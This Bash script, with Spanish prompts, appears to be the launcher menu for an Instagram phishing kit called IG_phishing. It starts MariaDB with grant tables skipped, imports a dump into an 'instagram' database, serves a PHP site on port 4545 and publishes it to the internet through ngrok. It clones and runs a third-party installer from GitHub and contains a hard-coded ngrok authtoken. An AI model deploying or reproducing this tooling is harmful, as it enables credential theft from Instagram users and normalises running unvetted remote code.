err() {                                              echo -e " \033[1;31m Error opcion invaalida"         
seleccion                                           
}
echo
seleccion(){
cd ~/IG_phishing	
#echo -e "\e[1;36m"                                  
echo -e -n "\e[1;35m  IG_PHISHING >> ";
printf $reset
read OPCION;

case $OPCION in

01)                 
mysqld --skip-grant-tables --general-log &
 ;;	

02)
	if [ -e $PREFIX/bin/dump.sql ]
then
echo -e "\e[1;33m  LA DATABASE-FB YA ESTA CREADA"
sleep 1.5
clear
banner
seleccion


else
cd ~/IG_phishing
cp -r dump.sql $PREFIX/bin
cd $PREFIX/bin
mariadb -u root -e "create database instagram"
mariadb -u root instagram < dump.sql
	fi
;;

03)
nmap 127.0.0.1
sleep 3.0
clear
banner
seleccion


;;

04) 
	php -S localhost:4545
	;;

05)
	#Verificando si existe ngrok

if [ -e $PREFIX/bin/ngrok ]
then
echo -e "\e[1;33m  ngrok ya esta  instalado"         
sleep 1.5
echo -e "\e[1;35m  iniciando el puerto 4545"
sleep 1.5
ngrok http 4545
	echo
        exit
else
git clone https://github.com/venom-24/Tunel-ngrok.git
cd Tunel-ngrok;ls
chmod +x *;ls
bash install.sh
sleep 1.5
ngrok authtoken 34lOv5kTa7OAD6xvipdrPW76lU5_5sKqu23x4wNjEdJSsKqjC

ngrok http 4545
fi
;;
                                                           

00)
	exit
	;;
*) err;;	
esac    
}       
banner
seleccion
